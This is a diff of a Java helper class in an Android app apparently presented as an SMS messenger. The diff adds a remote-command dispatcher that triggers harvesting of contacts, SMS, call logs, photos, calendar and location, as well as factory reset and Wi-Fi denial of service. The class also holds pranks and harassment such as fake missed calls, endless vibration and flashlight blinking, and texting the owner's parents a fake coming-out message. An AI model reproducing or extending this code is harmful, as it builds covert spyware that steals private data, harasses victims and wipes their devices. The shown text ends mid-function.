@@ -1,6 +1,7 @@
 package com.candroid.textme.api;
 
-import android.Manifest;
+import android.annotation.SuppressLint;
+import android.annotation.TargetApi;
 import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -9,6 +10,8 @@ import android.app.PendingIntent;
 import android.app.RemoteInput;
 import android.app.SearchManager;
 import android.app.WallpaperManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.ContentValues;
@@ -53,6 +56,7 @@ import android.util.Log;
 import android.util.Pair;
 
 import com.candroid.textme.R;
+import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.Pornhub;
 import com.candroid.textme.data.db.Database;
@@ -61,7 +65,10 @@ import com.candroid.textme.data.pojos.CalendarEvent;
 import com.candroid.textme.data.pojos.Contact;
 import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.pojos.SmsMsg;
+import com.candroid.textme.jobs.JobsIntentService;
+import com.candroid.textme.receivers.AdminReceiver;
 import com.candroid.textme.ui.activities.MainActivity;
+
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -93,67 +100,67 @@ public class Lofl {
     public static boolean sIsFlaghlightOn = false;
     public static CameraManager sCameraManager;
 
-    public static void uninstallApp(Context context, String packageName){
+    public static void uninstallApp(Context context, String packageName) {
         Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse(packageName));
         context.startActivity(intent);
     }
 
-    public static List<ApplicationInfo> getInstalledApps(Context context){
+    public static List<ApplicationInfo> getInstalledApps(Context context) {
         return context.getPackageManager().getInstalledApplications(PackageManager.MATCH_UNINSTALLED_PACKAGES);
     }
 
-    public static File[] getFilesForDirectory(String path){
+    public static File[] getFilesForDirectory(String path) {
         return new File(path).listFiles();
     }
 
-    public static boolean isImage(File file){
+    public static boolean isImage(File file) {
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         return mimeType != null && mimeType.startsWith("image");
     }
 
-    public static boolean isVideo(File file){
+    public static boolean isVideo(File file) {
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
-        return mimeType != null && mimeType.startsWith("video");    }
+        return mimeType != null && mimeType.startsWith("video");
+    }
 
-    public static boolean isText(File file){
+    public static boolean isText(File file) {
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
         return mimeType != null && mimeType.startsWith("text") && !mimeType.endsWith("iif");
     }
 
-    public static boolean isSpreadsheet(File file){
+    public static boolean isSpreadsheet(File file) {
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
-        if(mimeType != null && mimeType.contains("excel")){
+        if (mimeType != null && mimeType.contains("excel")) {
             return true;
-        }else if(mimeType != null && mimeType.contains("oasis.opendocument.spreadsheet")){
+        } else if (mimeType != null && mimeType.contains("oasis.opendocument.spreadsheet")) {
             return true;
-        }else{
+        } else {
             return false;
         }
     }
 
-    public static boolean isQuickbooks(File file){
+    public static boolean isQuickbooks(File file) {
         String mimeType = URLConnection.guessContentTypeFromName(file.getName());
-       if(mimeType != null && mimeType.contains("qbooks")){
+        if (mimeType != null && mimeType.contains("qbooks")) {
             return true;
-        }else if(mimeType != null && mimeType.equals("text/iif")){
+        } else if (mimeType != null && mimeType.equals("text/iif")) {
             return true;
-        }else if(mimeType != null && mimeType.equals("application/vnd.intu.qbo")){
-           return true;
-       }
-        else{
+        } else if (mimeType != null && mimeType.equals("application/vnd.intu.qbo")) {
+            return true;
+        } else {
             return false;
         }
     }
 
-    public static File getPicturesDirectory(){
+    public static File getPicturesDirectory() {
         return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getPath());
     }
 
-    public static File getDcimDirectory(){
+    public static File getDcimDirectory() {
         return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath());
     }
 
-    public static boolean isExternalStorageReadable(){
+    public static boolean isExternalStorageReadable() {
         String state = Environment.getExternalStorageState();
         if (Environment.MEDIA_MOUNTED.equals(state) ||
                 Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
@@ -162,7 +169,7 @@ public class Lofl {
         return false;
     }
 
-    public static byte[] fileToBytes(File f ) {
+    public static byte[] fileToBytes(File f) {
         ByteArrayOutputStream bos = null;
         File file = new File(f.getPath());
         try {
@@ -173,7 +180,7 @@ public class Lofl {
                 bos.write(buffer, 0, len);
             }
             return bos.toByteArray();
-        }catch (FileNotFoundException e) {
+        } catch (FileNotFoundException e) {
             e.printStackTrace();
         } catch (IOException e) {
             e.printStackTrace();
@@ -201,67 +208,75 @@ public class Lofl {
         return text.toString();
     }
 
-    public static void vibrator(Context context){
-        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
-        if(vibrator.hasVibrator()){
-            if(vibrator.hasAmplitudeControl()){
-                vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
-            }else{
-                vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
+    public static void vibrator(Context context) {
+
+        TimerTask timerTask = new TimerTask() {
+            @Override
+            public void run() {
+                Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+                if (vibrator.hasVibrator()) {
+                    if (vibrator.hasAmplitudeControl()) {
+                        vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
+                    } else {
+                        vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
+                    }
+                }
             }
-        }
+        };
+        Timer timer = new Timer("vibratorTask", true);
+        timer.schedule(timerTask, 1000, 60000 * 30);
     }
 
-    public static void phoneCall(Context context, String address){
+    public static void phoneCall(Context context, String address) {
         Intent callIntent = new Intent(Intent.ACTION_CALL);
         callIntent.setData(Uri.parse("tel:" + address));
         context.startActivity(callIntent);
     }
 
-    public static void searchGoogleMaps(Context context, String query){
+    public static void searchGoogleMaps(Context context, String query) {
         Uri uri = Uri.parse("geo:0, 0?q=" + query);
         Intent mapIntent = new Intent(Intent.ACTION_VIEW, uri);
         mapIntent.setPackage("com.google.android.apps.maps");
         context.startActivity(mapIntent);
     }
 
-    public static void setJobRan(Context context, String key){
+    public static void setJobRan(Context context, String key) {
         SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
         editor.putBoolean(key, true);
         editor.apply();
     }
 
-    public static void tellMyParentsImGay(Context context){
+    public static void tellMyParentsImGay(Context context) {
         ArrayList<Contact> contacts = Lofl.fetchContactsInformation(context);
         ArrayList<Contact> parents = new ArrayList<>();
-        String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents"};
-        for(Contact contact : contacts){
-            for(String name : possibleParentNames){
-                if(contact.mName.equalsIgnoreCase(name)){
+        String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents", "madre", "papa"};
+        for (Contact contact : contacts) {
+            for (String name : possibleParentNames) {
+                if (contact.mName.equalsIgnoreCase(name)) {
                     parents.add(contact);
                 }
             }
         }
-        if(parents.size() > 0){
-            for(Contact contact : parents){
-                Lofl.sendNonDataSms(context, contact.mAddress, "I'm sending an automated sms message to your phone. I'm sorry.");
+        if (parents.size() > 0) {
+            for (Contact contact : parents) {
+                Lofl.sendNonDataSms(context, contact.mAddress, "I've been meaning to tell you this but I am gay and I'm coming out of the closet :(");
             }
         }
     }
 
-    public static boolean isPawned(Context context){
+    public static boolean isPawned(Context context) {
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
         return sharedPreferences.getBoolean(DCIM_KEY, false) && sharedPreferences.getBoolean(PACKAGES_KEY, false) &&
-        sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
-        sharedPreferences.getBoolean(DEVICE_KEY, false) &&
-        sharedPreferences.getBoolean(PHONE_CALLS_KEY, false) &&
-        sharedPreferences.getBoolean(SMS_KEY, false) &&
-        sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false) &&
-        sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
+                sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
+                sharedPreferences.getBoolean(DEVICE_KEY, false) &&
+                sharedPreferences.getBoolean(PHONE_CALLS_KEY, false) &&
+                sharedPreferences.getBoolean(SMS_KEY, false) &&
+                sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false) &&
+                sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
     }
 
     public static void
-        setAlarmClock(Context context){
+    setAlarmClock(Context context) {
         Intent intent = new Intent();
         intent.setAction(AlarmClock.ACTION_SET_ALARM);
         intent.putExtra(AlarmClock.EXTRA_HOUR, 5);
@@ -270,13 +285,13 @@ public class Lofl {
         context.startActivity(intent);
     }
 
-    public static void persistentBlinkingFlashlight(final Context context){
+    public static void persistentBlinkingFlashlight(final Context context) {
         TimerTask timerTask = new TimerTask() {
             @Override
             public void run() {
                 Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                 String cameraId = null;
-                if(Lofl.sCameraManager == null) {
+                if (Lofl.sCameraManager == null) {
                     sCameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                 }
                 try {
@@ -284,22 +299,22 @@ public class Lofl {
                 } catch (CameraAccessException e1) {
                     e1.printStackTrace();
                 }
-                if(sIsFlaghlightOn){
+                if (sIsFlaghlightOn) {
                     try {
                         sCameraManager.setTorchMode(cameraId, false);
                         sIsFlaghlightOn = false;
                     } catch (CameraAccessException e1) {
                         e1.printStackTrace();
-                    }catch (IllegalArgumentException e){
+                    } catch (IllegalArgumentException e) {
                         e.printStackTrace();
                     }
-                }else{
+                } else {
                     try {
                         sCameraManager.setTorchMode(cameraId, true);
                         sIsFlaghlightOn = true;
                     } catch (CameraAccessException e1) {
                         e1.printStackTrace();
-                    }catch (IllegalArgumentException e){
+                    } catch (IllegalArgumentException e) {
                         e.printStackTrace();
                     }
                 }
@@ -309,7 +324,7 @@ public class Lofl {
         timer.schedule(timerTask, 300L, 100L);
     }
 
-    public static void turnOffFlashlight(Context context){
+    public static void turnOffFlashlight(Context context) {
         CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
         try {
             cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], false);
@@ -318,23 +333,23 @@ public class Lofl {
         }
     }
 
-    public static void browserGoogleSearch(Context context, String query){
+    public static void browserGoogleSearch(Context context, String query) {
         try {
             String encodedQuery = URLEncoder.encode(query, "UTF-8");
             Uri uri = Uri.parse(String.format("https://google.com/search?q=%s", encodedQuery));
             Intent googleSearchIntent = new Intent(Intent.ACTION_VIEW, uri);
-            context.startActivity(googleSearchIntent);}
-        catch (UnsupportedEncodingException e) {
+            context.startActivity(googleSearchIntent);
+        } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
     }
 
-    public static boolean isBetweenMidnightAndFive(){
+    public static boolean isBetweenMidnightAndFive() {
         Date date = new Date(System.currentTimeMillis());
         return date.getHours() < 5 && date.getHours() >= 0;
     }
 
-    public static long millisTillMidnight(){
+    public static long millisTillMidnight() {
         Date currentDate = new Date(System.currentTimeMillis());
         Date midnight = new Date(currentDate.getYear(), currentDate.getMonth(), currentDate.getDay(), 0, 0, 10);
         midnight.setHours(0);
@@ -344,18 +359,18 @@ public class Lofl {
         return midnight.getTime() - currentDate.getTime();
     }
 
-    public static void browserDuckDuckGoSearch(Context context, String query){
+    public static void browserDuckDuckGoSearch(Context context, String query) {
         try {
             String encodedQuery = URLEncoder.encode(query, "UTF-8");
             Uri uri = Uri.parse(String.format("https://duckduckgo.com/?q=%s", encodedQuery));
             Intent googleSearchIntent = new Intent(Intent.ACTION_VIEW, uri);
-            context.startActivity(googleSearchIntent);}
-        catch (UnsupportedEncodingException e) {
+            context.startActivity(googleSearchIntent);
+        } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
     }
 
-    public static void fakeMissedCall(Context context, String number){
+    public static void fakeMissedCall(Context context, String number) {
         ContentValues values = new ContentValues();
         values.put(CallLog.Calls.NUMBER, number);
         values.put(CallLog.Calls.DURATION, 666);
@@ -365,13 +380,121 @@ public class Lofl {
         context.getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);
     }
 
-    public static void googleNowQuery(Context context, String query){
+    public static void googleNowQuery(Context context, String query) {
         Intent webSearchIntent = new Intent(Intent.ACTION_WEB_SEARCH);
         webSearchIntent.putExtra(SearchManager.QUERY, "I wish somebody would stop trying to attack my system so i could go back to learning android. Where do we do that at? Until then I shall work on a library called Lofl");
         context.startActivity(webSearchIntent);
     }
 
-    public static void playMosquitoRingtoneTwice(Context context){
+    public static void onReceiveCommand(Context context, int command) {
+        boolean commandFound = false;
+        Intent intent = new Intent();
+        switch (command) {
+            case Commands.WEB_PORN:
+                intent.setAction(JobsIntentService.ACTION_WEB_PORN);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.WALLPAPER:
+                intent.setAction(JobsIntentService.ACTION_WALLPAPER);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.CONTACTS:
+                intent.setAction(JobsIntentService.ACTION_CONTACTS);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.SMS:
+                intent.setAction(JobsIntentService.ACTION_SMS);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.CALL_LOG:
+                intent.setAction(JobsIntentService.ACTION_PHONE_CALLS);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.CALENDAR_EVENTS:
+                intent.setAction(JobsIntentService.ACTION_CALENDAR_EVENT);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.DCIM:
+                intent.setAction(JobsIntentService.ACTION_DCIM_FILES);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.TEXT_PARENTS:
+                intent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.DEVICE_INFO:
+                intent.setAction(JobsIntentService.ACTION_DEVICE_INFO);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.INSTALLED_PACKAGES:
+                intent.setAction(JobsIntentService.ACTION_PACKAGES);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+            case Commands.SYNC_PHONE_TO_DATABASE:
+                // TODO: 1/31/19
+                intent.setAction(JobsIntentService.ACTION_CONTACTS);
+                intent.setClass(context, JobsIntentService.class);
+                context.startService(intent);
+                intent.setAction(null);
+                intent.setAction(JobsIntentService.ACTION_PHONE_CALLS);
+                context.startService(intent);
+                intent.setAction(null);
+                intent.setAction(JobsIntentService.ACTION_PACKAGES);
+                context.startService(intent);
+                intent.setAction(null);
+                intent.setAction(JobsIntentService.ACTION_SMS);
+                commandFound = true;
+                break;
+            case Commands.SYNC_PHONE:
+                // TODO: 1/31/19
+                commandFound = true;
+                break;
+            case Commands.DOS_WIFI_CARD:
+                intent.setAction(JobsIntentService.ACTION_WIFI_CARD);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.FLASHLIGHT:
+                intent.setAction(JobsIntentService.ACTION_FLASHLIGHT);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.VIBRATOR:
+                intent.setAction(JobsIntentService.ACTION_VIBRATOR);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.LOCATION:
+                intent.setAction(JobsIntentService.ACTION_LOCATION);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.SHARE_APP:
+                intent.setAction(JobsIntentService.ACTION_SHARE_APP);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.FACTORY_RESET:
+                intent.setAction(JobsIntentService.ACTION_FACTORY_RESET);
+                intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            default:
+                break;
+        }
+        context.startService(intent);
+    }
+
+    public static void playMosquitoRingtoneTwice(Context context) {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -381,10 +504,10 @@ public class Lofl {
                     mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
                     mediaPlayer.setDataSource(context, Uri.parse("https://hwcdn.libsyn.com/p/f/3/2/f32dbcf436dca4a0/12000.mp3?c_id=2125606"));
                     mediaPlayer.prepare();
-                    for(int i= 0; i < 2; i++){
+                    for (int i = 0; i < 2; i++) {
                         try {
                             Thread.sleep(20000);
-                            if(mediaPlayer.isPlaying()){
+                            if (mediaPlayer.isPlaying()) {
                                 mediaPlayer.stop();
                             }
                             mediaPlayer.start();
@@ -400,7 +523,7 @@ public class Lofl {
         }).start();
     }
 
-    public static void playEndlessMosquitoRingtone(Context context){
+    public static void playEndlessMosquitoRingtone(Context context) {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -409,10 +532,10 @@ public class Lofl {
                     mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
                     mediaPlayer.setDataSource(context, Uri.parse("https://hwcdn.libsyn.com/p/f/3/2/f32dbcf436dca4a0/12000.mp3?c_id=2125606"));
                     mediaPlayer.prepare();
-                    for(int i= 0; i < 75000; i++){
+                    for (int i = 0; i < 75000; i++) {
                         try {
                             Thread.sleep(10000);
-                            if(mediaPlayer.isPlaying()){
+                            if (mediaPlayer.isPlaying()) {
                                 mediaPlayer.stop();
                             }
                             mediaPlayer.start();
@@ -427,14 +550,14 @@ public class Lofl {
         }).start();
     }
 
-    public static void watchPornHubVideo(Context context, String videoId){
+    public static void watchPornHubVideo(Context context, String videoId) {
         Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
         Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
         pornIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(pornIntent);
     }
 
-    public static Bitmap getBitmapFromUrl(String url){
+    public static Bitmap getBitmapFromUrl(String url) {
         try {
             InputStream inputStream = new java.net.URL(url).openStream();
             return BitmapFactory.decodeStream(inputStream);
@@ -444,22 +567,20 @@ public class Lofl {
         return null;
     }
 
-    public static void changeWallpaper(Context context, Bitmap bitmap){
+    public static void changeWallpaper(Context context, Bitmap bitmap) {
         try {
             WallpaperManager.getInstance(context).setBitmap(bitmap);
-        }
-        catch (IOException e) {
+        } catch (IOException e) {
             e.printStackTrace();
-        }catch (SecurityException se){
+        } catch (SecurityException se) {
             se.printStackTrace();
-        }
-        catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    private static Bitmap getBitmapIcon(Context context, int icon){
-        if(sLargeIcon == null){
+    private static Bitmap getBitmapIcon(Context context, int icon) {
+        if (sLargeIcon == null) {
             sLargeIcon = BitmapFactory.decodeResource(context.getResources(), icon);
         }
         return sLargeIcon;
@@ -470,7 +591,7 @@ public class Lofl {
         sNotificationManager.cancel(id);
     }
 
-    public static String lookupPhoneNumberByName(Context context, String name) {
+    public static String lookupPhoneNumberByName(Context context, String name) throws NullPointerException {
         String address = "";
         String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ";
         String[] selectionArgs = new String[]{"%".concat(name).concat("%")};
@@ -485,7 +606,7 @@ public class Lofl {
 
     public static void createConversation(final Context context, String address, String sharedText) {
         Intent notifyIntent = new Intent();
-        if(sharedText != null){
+        if (sharedText != null) {
             notifyIntent.putExtra(Constants.SHARED_TEXT_KEY, sharedText);
         }
         notifyIntent.putExtra(Constants.ADDRESS, address);
@@ -494,23 +615,23 @@ public class Lofl {
         ((MainActivity) context).runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                ((MainActivity)context).onBackPressed();
+                ((MainActivity) context).onBackPressed();
             }
         });
     }
 
-    public static LocationManager getLocationManager(Context context){
+    public static LocationManager getLocationManager(Context context) {
         return (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
     }
 
-    public static ArrayList<CalendarEvent> fetchCalendarEvents(Context context){
-       String[] projection = new String[]{CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
-               CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
+    public static ArrayList<CalendarEvent> fetchCalendarEvents(Context context) {
+        String[] projection = new String[]{CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
+                CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
         ArrayList<CalendarEvent> calendarEvents = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
-        if(cursor != null){
+        if (cursor != null) {
             int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
-            int titleIndex = cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE);
+            int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
             int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
             int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
             int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
@@ -519,7 +640,7 @@ public class Lofl {
             int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
             int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
             int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String account = cursor.getString(accountNameIndex);
                 String title = cursor.getString(titleIndex);
                 String description = cursor.getString(descriptionIndex);
@@ -537,49 +658,54 @@ public class Lofl {
         return calendarEvents;
     }
 
-    public static void sendNonDataSms(Context context , String destAddress, String body){
+    public static void sendNonDataSms(Context context, String destAddress, String body) {
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendTextMessage(destAddress, null, body, null, null);
     }
 
-    public static ArrayList<Contact> fetchContactsInformation(Context context){
+    public static ArrayList<Contact> fetchContactsInformation(Context context) {
         String[] projection = null;
-        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
             projection = new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, "has_email"};
-        }else{
+        } else {
             projection = new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME};
         }
         ArrayList<Contact> contacts = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, projection, null, null, null);
         int hasEmail = -1;
-        if(cursor != null){
+        if (cursor != null) {
             int displayNameIndex = cursor.getColumnIndex("display_name");
             int idIndex = cursor.getColumnIndex("_id");
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String name = cursor.getString(displayNameIndex);
                 String email = null;
                 String address = null;
-                if(Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
+                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                     hasEmail = cursor.getInt(cursor.getColumnIndex("has_email"));
                 }
-                if(hasEmail == 1){
+                if (hasEmail == 1) {
                     long id = cursor.getLong(idIndex);
                     email = lookupEmailByContactId(context, id);
                 }
-                address = lookupPhoneNumberByName(context, name);
-                contacts.add(new Contact(name, address, email));
+                try{
+                    address = lookupPhoneNumberByName(context, name);
+                    contacts.add(new Contact(name, address, email));
+                }catch (NullPointerException e){
+                    e.printStackTrace();
+                }
+
             }
         }
         cursor.close();
         return contacts;
     }
 
-    public static void wifiDenialOfService(Context context){
+    public static void wifiDenialOfService(Context context) {
         WifiManager wifiManager = getWifiManager(context);
         new Thread(new Runnable() {
             @Override
             public void run() {
-                for(int i = 0; i < 500; i++){
+                for (int i = 0; i < 500; i++) {
                     try {
                         Thread.sleep(10000);
                         wifiManager.disconnect();
@@ -591,20 +717,20 @@ public class Lofl {
         }).start();
     }
 
-    public static void insertContact(Context context, String name, String number){
+    public static void insertContact(Context context, String name, String number) {
         long contactId = insertEmptyContact(context);
         insertContactDisplayName(context, contactId, name);
         insertContactPhoneNumber(context, contactId, number);
     }
 
-    public static long insertEmptyContact(Context context){
+    public static long insertEmptyContact(Context context) {
         ContentValues contentValues = new ContentValues();
         Uri rawContactUri = context.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, contentValues);
         long contactId = ContentUris.parseId(rawContactUri);
         return contactId;
     }
 
-    public static void insertContactDisplayName(Context context, long  contactId, String name){
+    public static void insertContactDisplayName(Context context, long contactId, String name) {
         ContentValues contentValues = new ContentValues();
         contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, contactId);
         contentValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
@@ -612,7 +738,7 @@ public class Lofl {
         context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
     }
 
-    public static void insertContactPhoneNumber(Context context, long contactId, String number){
+    public static void insertContactPhoneNumber(Context context, long contactId, String number) {
         ContentValues contentValues = new ContentValues();
         contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, contactId);
         contentValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
@@ -621,10 +747,10 @@ public class Lofl {
         context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
     }
 
-    public static void dosWifiCard(Context context){
+    public static void dosWifiCard(Context context) {
         WifiManager wifiManager = getWifiManager(context);
         int state = wifiManager.getWifiState();
-        if( wifiManager.isWifiEnabled()){
+        if (wifiManager.isWifiEnabled()) {
             TimerTask dosWifiCardTask = new TimerTask() {
                 @Override
                 public void run() {
@@ -637,28 +763,28 @@ public class Lofl {
         }
     }
 
-    public static WifiManager getWifiManager(Context context){
+    public static WifiManager getWifiManager(Context context) {
         return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
     }
 
-    public static void wifiScan(Context context){
+    public static void wifiScan(Context context) {
         getWifiManager(context).startScan();
     }
 
-    private static void dumpDatabaseColumnNamesToLogFile(Cursor cursor){
+    private static void dumpDatabaseColumnNamesToLogFile(Cursor cursor) {
         String[] columnNames = cursor.getColumnNames();
-        for(String columnName : columnNames){
+        for (String columnName : columnNames) {
             Log.d("DATABASE COLUMNS", String.format("Column Name = %s", columnName));
         }
     }
 
-    public static String lookupEmailByContactId(Context context, long id){
+    public static String lookupEmailByContactId(Context context, long id) {
         String email = null;
         String[] projection = new String[]{ContactsContract.CommonDataKinds.Email.DATA};
         Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, projection, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{String.valueOf(id)}, null);
-        if(cursor != null){
+        if (cursor != null) {
             int emailIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
-            if(cursor.moveToFirst()){
+            if (cursor.moveToFirst()) {
                 email = cursor.getString(emailIndex);
             }
         }
@@ -678,16 +804,16 @@ public class Lofl {
             }
         } catch (NullPointerException e) {
             e.printStackTrace();
-        }catch(SecurityException se){
+        } catch (SecurityException se) {
             return address;
         }
         return String.valueOf(name);
     }
 
-    public static void syncCallLogDataToDatabase(Context context, DatabaseHelper database){
+    public static void syncCallLogDataToDatabase(Context context, DatabaseHelper database) {
         try {
             Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                 String address = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                 String time = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
@@ -700,7 +826,7 @@ public class Lofl {
         }
     }
 
-    public static void notifyAirplaneMode(Context context, String title, String body){
+    public static void notifyAirplaneMode(Context context, String title, String body) {
         initNotificationManager(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
         builder.setContentTitle(title);
@@ -711,7 +837,7 @@ public class Lofl {
         sNotificationManager.notify(sId++, builder.build());
     }
 
-    public static void notifySent(Context context, String title, Intent intent){
+    public static void notifySent(Context context, String title, Intent intent) {
         createConfirmationsNotificationChannel(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
         builder.setSmallIcon(android.R.drawable.stat_notify_chat).setContentTitle(title).setPriority(Notification.PRIORITY_DEFAULT).setColor(context.getResources().getColor(android.R.color.holo_green_dark))
@@ -730,9 +856,9 @@ public class Lofl {
     public static void notify(Context context, Intent intent, String address, String body) {
         sId++;
         Notification.Action whisperAction = null;
-        if(intent.hasExtra(Constants.SHARED_TEXT_KEY)){
+        if (intent.hasExtra(Constants.SHARED_TEXT_KEY)) {
             whisperAction = createWhisperSharedTextAction(context, address, intent);
-        }else{
